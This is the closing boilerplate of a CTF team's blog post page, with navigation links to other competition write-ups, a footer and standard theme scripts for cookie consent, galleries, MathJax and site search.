href="/tags/WMCTF/">WMCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/48139.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">强网杯 S4 SU Write-Up</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/6862.html"><span class="level-item">高校战“疫”网络安全分享赛 2020 SU Write Up</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>